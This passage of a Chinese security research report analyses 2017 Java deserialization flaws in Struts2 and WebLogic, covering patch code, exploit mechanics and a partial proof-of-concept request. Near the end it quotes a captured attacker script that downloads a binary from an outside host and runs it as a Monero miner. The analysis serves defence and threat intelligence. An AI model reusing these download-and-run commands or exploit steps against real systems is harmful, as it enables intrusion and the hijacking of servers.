###### 3.1.1 补丁
补丁的核心部分如下：
    +    protected void addDefaultPermissions(ActionInvocation invocation, XStream stream) {
      +        stream.addPermission(new ExplicitTypePermission(new Class[]{invocation.getAction().getClass()}));
      +        if (invocation.getAction() instanceof ModelDriven) {
      +            stream.addPermission(new ExplicitTypePermission(new Class[]{((ModelDriven) invocation.getAction()).getModel().getClass()}));
      +        }
      +        stream.addPermission(NullPermission.NULL);
      +        stream.addPermission(PrimitiveTypePermission.PRIMITIVES);
      +        stream.addPermission(ArrayTypePermission.ARRAYS);
      +        stream.addPermission(CollectionTypePermission.COLLECTIONS);
      +        stream.addPermission(new ExplicitTypePermission(new Class[]{Date.class}));
      +    }
主要就是将xml中的数据白名单化，把Collection和Map，一些基础类，时间类放在白名单中，这样就能阻止XStream反序列化的过程中带入一些有害类。
###### 3.1.2 分析
首先分析入口文件，在Struts2的配置文件中有如下xml描述信息：
也就是说ContentType为xml的所有请求都会交给XStreamHandler来处理，XStreamHanler.toObject调用了XStream.fromXml来处理那些请求中的xml信息，从而进入反序列化流程。
这里面最有意思的应该是官方给的临时缓解措施不起作用，官方给出的缓解措施``，从字面意思也能看出来，这个是针对action的后缀的，也就是说如果后缀不带xml也就可以绕过。而POST请求一般不带xml后缀直接忽视这个缓解措施。下图就是一个示例：
所以说Struts的官方也是根据PoC修漏洞，没完全测试过的东西就直接放出来。XStream只跟Content-Type有关，如果Content-Type中含有xml，则会交给XStream处理，更多的详情分析见4
##### 3.2 S2-055分析
2017年12月1日，Apache Struts发布最新的安全公告，Apache Struts 2.5.x
REST插件存在远程代码执行的中危漏洞，漏洞编号与CVE-2017-7525相关。漏洞的成因是由于使用的Jackson版本过低在进行JSON反序列化的时候没有任何类型过滤导致远程代码执行。当然官方说的影响是未知，其实这里是远程代码执行。
###### S2-055补丁
没有提供补丁，只是提醒升级Jackson库版本。
###### S2-055分析
为了让Jackson支持多态，Jackson官方提供了几种方式，第一种全局Default
Typing机制，第二种为相应的class添加@JsonTypeInfo注解。这里会启用第二种方式，在第二种方式中，大体代码如下：
    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY)
         public Object clientName;
在clientName上方添加注解，打开支持多态的特性，这样我们就能指定clientName的类型；另一个是将clientName的类型改为Object类型，这样就避免了类型不匹配或者不是其子类的错误。
另外Jackson不是默认句柄，需要设置ContentTypeHandler，这样当Content-Type为application/json格式的请求都交给了JcaksonLibHandler来处理。具体的PoC就是Jackson的PoC，这里不再展示，详情分析见5。这个漏洞和S2-052非常类似，都是引用的第三方库存在缺陷导致的漏洞，这样的案例数不胜数，在Java生态中简直就是一个灾难，第三方依赖实在太多。
#### 4 Weblogic
在2017年，整个Oracle的产品线都深受反序列化影响，其中Weblogic影响面尤其广泛，很多漏洞的CVSS评分都是9.8，9.9甚至为10.
而且CVE-2017-3248的PoC已经在github上，并且被用于黑产，CVE-2017-10352 PoC也被泄露同样被用于黑产。
##### 4.1 CVE-2017-3248 分析
这个漏洞(CVE-2017-3248)就是利用rmi机制的缺陷，通过JRMP协议达到执行任意反序列化payload的目的。利用步骤可以分为两步，第一步建立JRMP监听端口，第二步执行反序列化操作，其反序列化内容指向外部的JRMP监听端口，这样在反序列的过程中就会从远程JRMP监听端口加载内容并执行序列化操作，详细的利用工具可以使用ysoserial。
##### 4.2 CVE-2017-10352 分析
这个漏洞是由于XMLDecoder这个缺陷库存在代码执行问题，同样也是由于被黑产利用而被大家广泛得知。其实在CVE-2017-3506中，Weblogic官方已经做了一次修补，只是当时的修补不够彻底，后来有研究员给Weblogic提供了绕过的PoC，Weblogic官方再次完整修补。同时这个PoC也被泄露，非常多的用户中招。
###### 4.2.1 补丁
补丁的核心代码如下：
    private void validate(InputStream is) {
        WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
        try {
           SAXParser parser = factory.newSAXParser();
           parser.parse(is, new DefaultHandler() {
              private int overallarraylength = 0;
              public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
                 if(qName.equalsIgnoreCase("object")) {
                    throw new IllegalStateException("Invalid element qName:object");
                 } else if(qName.equalsIgnoreCase("new")) {
                    throw new IllegalStateException("Invalid element qName:new");
                 } else if(qName.equalsIgnoreCase("method")) {
                    throw new IllegalStateException("Invalid element qName:method");
                 } else {
                    if(qName.equalsIgnoreCase("void")) {
                       for(int attClass = 0; attClass &lt; attributes.getLength(); ++attClass) {
                          if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
                             throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                          }
                       }
                    }
                    if(qName.equalsIgnoreCase("array")) {
                       String var9 = attributes.getValue("class");
                       if(var9 != null &amp;&amp; !var9.equalsIgnoreCase("byte")) {
                          throw new IllegalStateException("The value of class attribute is not valid for array element.");
                       }
这个补丁限定了object，new,method,void，array等字段，就限定了不能生成java 实例。
###### 4.2.2 分析
根据补丁大概就得就能猜出相应的PoC，具体如下：
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: 192.168.3.216:7001
    Accept-Encoding: identity
    Content-Length: 683
    Accept-Language: zh-CN,zh;q=0.8
    Accept: */*
    User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
    Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
    Connection: keep-alive
    Cache-Control: max-age=0
    Content-Type: text/xml
                  。。。。
在动态调试过程中这个调用栈非常深，我们简单解释一下关键的几个部位，首先是WorkContextServerTube.java中processRequest方法，主要功能就是分割整个xml，抽取真正执行的xml交给readHeadOld方法，也就是请求中`soapenv:Header`包裹的部分，这一部分最终会交给XMLDecoder，XMLDecoder完成数据到对象的转换，即会执行恶意代码。并且wls-wsat是一个特权应用，无需用户名密码验证，所以危害非常大。
更多详情分析可参考文档 6 , 同时绿盟科技这篇报告的英文版还被Java-Deserialization-Cheat-Sheet收录。
###### 4.2.3 黑产利用
在绿盟的IPS设备或者蜜罐设备就能看到很多这种利用Weblogic
XMLDecoder（CVE-2017-10352）进行黑产利用的特征，下面是绿盟IPS抓到的示例，具体如下：
    srcip为173.212.217.181
     POST /wls-wsat/CoordinatorPortType HTTP/1.1////0d////0aHost: 58.210.×.×:
对于linux系统会去191.101.180.74下载一个bash脚本执行挖坑行为（门罗币）。这个robots.txt的核心内容如下：
    wget -q http://45.123.190.178/Silence -O /tmp/Silence
     curl -o /tmp/Silence http://45.123.190.178/Silence
     else
     exit 0;
     fi
     chmod +x /tmp/Silence
     nohup /tmp/Silence -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44pgg5mYVH6Gnc7gKfWGPR2CxfQLhwdrCPJGzLonwrSt5CKSeEy6izyjEnRn114HTU7AWFTp1SMZ6eqQfvrdeGWzUdrADDu -p x -R 1 &amp;&gt;&gt;/dev/null &amp;
     sleep 10
     rm -rf /tmp/Silence
对srcip：173.212.217.181溯源跟踪，从绿盟科技威胁情报中心NTI中的数据也能看出，该IP从2017年8月份开始，一直被用于特定漏洞扫描以便发现更多具有脆弱性的主机。
### 总结
从OWASP 2017 top
ten报告中可以看出反序列化是一个业内都开始关注重视的漏洞类型，一个原因就是该漏洞很多时候都是通过黑名单的方式的修复，这就导致了层出不穷的绕过，从Jackson，fastjson，weblogic一见端倪，都是修复，绕过，再修复，再绕过，没有尽头。另外一个原因就是该漏洞的危害非常大，通常都是RCE，一个PoC直接获取系统权限，不管是黑产，灰产，开发，运维还有白帽安全人员都非常重视该类型的漏洞。从系统的重要性来看，国内很多商业系统都是基于Java框架开发，这些中间件或者Web容器一旦出现漏洞，整个系统都变得不堪一击，可能造成不可挽回的影响。
对于反序列漏洞的防御，业内也是一个难题，首先得确保所有的依赖库和容器已经更新到最新版本，这样能防止已知漏洞的攻击。另外绿盟科技的IPS，WAF都已经具备对这些漏洞的防护能力，更多的防护策略请参考绿盟科技下一篇关于反序列化漏洞防御的文档。
### 相关链接
* * *